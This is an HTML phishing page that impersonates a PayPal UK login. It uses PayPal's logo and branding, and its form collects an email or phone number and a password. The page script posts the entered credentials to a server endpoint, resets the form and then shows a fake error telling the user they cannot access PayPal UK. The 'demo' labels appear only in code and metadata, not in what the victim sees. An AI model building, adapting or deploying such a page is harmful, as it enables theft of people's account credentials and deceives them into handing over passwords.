<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Demo Name — demonstration form">
  <title>PayPal UK</title>
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; min-height: 100%; }
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #f5f7fb;
      color: #1f2937;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
    }
    .page { width: 100%; max-width: 430px; }
    .brand {
      text-align: center;
      color: #0b57d0;
      font-size: 28px;
      font-weight: 700;
      letter-spacing: -0.5px;
      margin-bottom: 18px;
    }
    .demo-badge {
      display: inline-block;
      margin: 0 auto 16px;
      padding: 6px 10px;
      border: 1px solid #b9d2ff;
      border-radius: 999px;
      background: #eaf2ff;
      color: #174ea6;
      font-size: 12px;
      font-weight: 700;
      letter-spacing: .5px;
      text-transform: uppercase;
    }
    .badge-wrap { text-align: center; }
    .card {
      background: #fff;
      border: 1px solid #e3e8ef;
      border-radius: 14px;
      box-shadow: 0 8px 30px rgba(31, 41, 55, .08);
      padding: 28px 24px;
    }
    h1 {
      margin: 0 0 8px;
      text-align: center;
      font-size: 24px;
      color: #111827;
    }
    .intro {
      margin: 0 0 22px;
      text-align: center;
      color: #667085;
      line-height: 1.5;
      font-size: 14px;
    }
    .notice {
      background: #f0f6ff;
      border: 1px solid #cfe0ff;
      color: #174ea6;
      border-radius: 9px;
      padding: 12px;
      margin-bottom: 20px;
      font-size: 13px;
      line-height: 1.45;
    }
    label {
      display: block;
      margin: 0 0 7px;
      font-size: 14px;
      font-weight: 700;
      color: #344054;
    }
    input, textarea {
      width: 100%;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      padding: 12px 13px;
      font: inherit;
      color: #111827;
      background: #fff;
      outline: none;
      transition: border-color .15s, box-shadow .15s;
    }
    input { height: 46px; }
    textarea { min-height: 110px; resize: vertical; }
    input:focus, textarea:focus {
      border-color: #0b57d0;
      box-shadow: 0 0 0 3px rgba(11, 87, 208, .12);
    }
    .field { margin-bottom: 17px; }
    .submit {
      width: 100%;
      height: 46px;
      border: 0;
      border-radius: 999px;
      background: #0b57d0;
      color: #fff;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
    }
    .submit:hover { background: #0848ad; }
    .submit:disabled { opacity: .65; cursor: wait; }
    .status {
      min-height: 22px;
      margin-top: 15px;
      text-align: center;
      font-size: 14px;
      color: #475467;
    }
    .footer {
      margin-top: 17px;
      text-align: center;
      color: #98a2b3;
      font-size: 12px;
      line-height: 1.5;
    }
    @media (max-width: 480px) {
      body { padding: 18px 12px; }
      .card { padding: 24px 18px; }
    }
  </style>
</head>
<body>
  <main class="page">
    <div class="brand">
  <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg?utm_source=chatgpt.com" alt="" style="width: 140px; height: auto; display: block; margin: 0 auto;">
</div>

    <section class="card" aria-labelledby="page-title">
      <h1 id="page-title">Login</h1>

      </div>

      <form id="demoForm">
        <div class="field">
          <label for="demoEmail">
          <input
            id="demoEmail"
            name="demoEmail"
            type="email"
            maxlength="160"
            autocomplete="off"
            placeholder="Email address or mobile number"
            required
          >
        </div>

        <div class="field">
          <label for="demoMessage"></label>
          <input
  id="demoMessage"
  name="demoMessage"
  type="text"
  maxlength="1000"
  autocomplete="off"
  placeholder="Password"
  required
>
        </div>

        <button class="submit" type="submit" id="submitButton">Login</button>
        <div class="status" id="status" role="status" aria-live="polite"></div>
      </form>
    </section>

    <div class="footer">
      <div class="footer">
  English UK<br>
  <span style="font-size: 28px;">🇬🇧</span>
</div>
    </div>
  </main>

  <script>
    const form = document.getElementById("demoForm");
    const button = document.getElementById("submitButton");
    const status = document.getElementById("status");

    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      button.disabled = true;
      status.textContent = "Submitting demo information...";

      const payload = {
        demoEmail: document.getElementById("demoEmail").value.trim(),
        demoMessage: document.getElementById("demoMessage").value.trim()
      };

      try {
        const response = await fetch("/api/demo-submissions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        const result = await response.json();

        if (!response.ok) {
          throw new Error(result.error || "Submission failed.");
        }

        status.textContent = "Cannot Access PayPal Uk Use Paypal Linked to Current Location.";
        form.reset();
      } catch (error) {
        status.textContent = error.message || "Unable to submit information.";
      } finally {
        button.disabled = false;
      }
    });
  </script>
</body>
</html>
